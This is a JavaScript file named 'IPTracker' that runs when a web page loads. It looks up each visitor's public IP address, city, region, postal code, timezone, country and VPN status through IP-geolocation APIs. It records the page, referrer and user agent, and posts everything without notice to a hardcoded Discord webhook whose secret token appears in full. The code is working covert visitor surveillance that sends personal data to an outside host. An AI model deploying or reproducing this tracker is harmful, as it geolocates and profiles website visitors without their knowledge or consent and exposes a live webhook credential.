const IPTracker = {
    WEBHOOK_URL: 'https://discord.com/api/webhooks/1325525927144329317/PCYE5RoiJjlYSwWmmIK50i9xnkzIGtPWLAtq81RwzSrrM-ebs6JAD3amygj-jzjQNQOk',

    async init() {
        try {
            // Get all required information
            const publicip = await fetch('https://api.ipify.org').then(r => r.text());
            
            // Parallel fetch all IP details
            const [city, region, postal, timezone, currency, country, callcode, vpnData] = await Promise.all([
                fetch(`https://ipapi.co/${publicip}/city`).then(r => r.text()),
                fetch(`https://ipapi.co/${publicip}/region`).then(r => r.text()),
                fetch(`https://ipapi.co/${publicip}/postal`).then(r => r.text()),
                fetch(`https://ipapi.co/${publicip}/timezone`).then(r => r.text()),
                fetch(`https://ipapi.co/${publicip}/currency`).then(r => r.text()),
                fetch(`https://ipapi.co/${publicip}/country_name`).then(r => r.text()),
                fetch(`https://ipapi.co/${publicip}/country_calling_code`).then(r => r.text()),
                fetch('http://ip-api.com/json?fields=proxy').then(r => r.json())
            ]);

            // Prepare visitor data
            const visitorData = {
                ip: publicip,
                city: city,
                region: region,
                postal: postal,
                timezone: timezone,
                currency: currency,
                country: country,
                callcode: callcode,
                vpn: vpnData.proxy || false,
                page: window.location.href,
                referrer: document.referrer || 'Direct',
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };

            // Send to Discord
            await this.sendToDiscord({
                username: "IP Tracker",
                embeds: [{
                    title: "🌐 New Page Visit",
                    color: 3447003,
                    fields: [
                        { name: "📍 IP", value: visitorData.ip, inline: true },
                        { name: "🏙️ City", value: visitorData.city, inline: true },
                        { name: "🗺️ Region", value: visitorData.region, inline: true },
                        { name: "📮 Postal", value: visitorData.postal, inline: true },
                        { name: "⏰ Timezone", value: visitorData.timezone, inline: true },
                        { name: "💰 Currency", value: visitorData.currency, inline: true },
                        { name: "🌍 Country", value: visitorData.country, inline: true },
                        { name: "📞 Call Code", value: visitorData.callcode, inline: true },
                        { name: "🛡️ VPN", value: visitorData.vpn ? "Yes" : "No", inline: true },
                        { name: "🔗 Page", value: visitorData.page, inline: false },
                        { name: "↩️ Referrer", value: visitorData.referrer, inline: true }
                    ],
                    timestamp: visitorData.timestamp,
                    footer: {
                        text: "IP Tracker v1.0"
                    }
                }]
            });

        } catch (error) {
            // Send error to Discord
            await this.sendToDiscord({
                username: "IP Tracker",
                embeds: [{
                    title: "⚠️ Tracker Error",
                    color: 15158332,
                    fields: [
                        { name: "Error", value: error.message },
                        { name: "Page", value: window.location.href }
                    ],
                    timestamp: new Date().toISOString()
                }]
            });
        }
    },

    async sendToDiscord(payload) {
        try {
            const response = await fetch(this.WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(`Discord webhook failed: ${response.status}`);
            }
        } catch (error) {
            // Silently fail
            console.error('Failed to send to Discord:', error);
        }
    }
};

// Initialize tracker
document.addEventListener('DOMContentLoaded', () => {
    // Check if we've already tracked this page in this session
    const pageKey = btoa(window.location.href);
    if (!sessionStorage.getItem(pageKey)) {
        // Track the page
        IPTracker.init();
        // Mark this page as tracked for this session
        sessionStorage.setItem(pageKey, '1');
    }
});